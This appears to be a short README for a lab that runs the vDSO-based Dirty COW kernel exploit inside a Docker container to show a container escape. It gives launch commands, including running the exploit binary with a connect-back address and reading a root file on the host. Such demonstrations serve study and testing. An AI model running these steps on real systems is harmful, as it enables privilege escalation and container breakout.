# dirtycow-docker-vdso_1

This directory contains the necessary code to get the vdso based Dirty Cow POC working inside a docker container. 
All the really exciting stuff was done by Scumjr, see his POC repo over at https://github.com/scumjr/dirtycow-vdso.

To execute:
	vagrant up
	vagrant putty
	cd /home/vagrant/vDSO-exploit && sudo docker run -it -p 1234:1234 ubuntu-dirtycow /bin/sh

	note that we are a regular user inside the docker container (user: hacker)

	/tmp/foo/0xdeadbeef 172.17.0.2:1234

Wait a few minutes for the exploit to launch 

Show the breakout of the container by catting the root file on the host OS:
	cat /root/this_is_the_host
	
  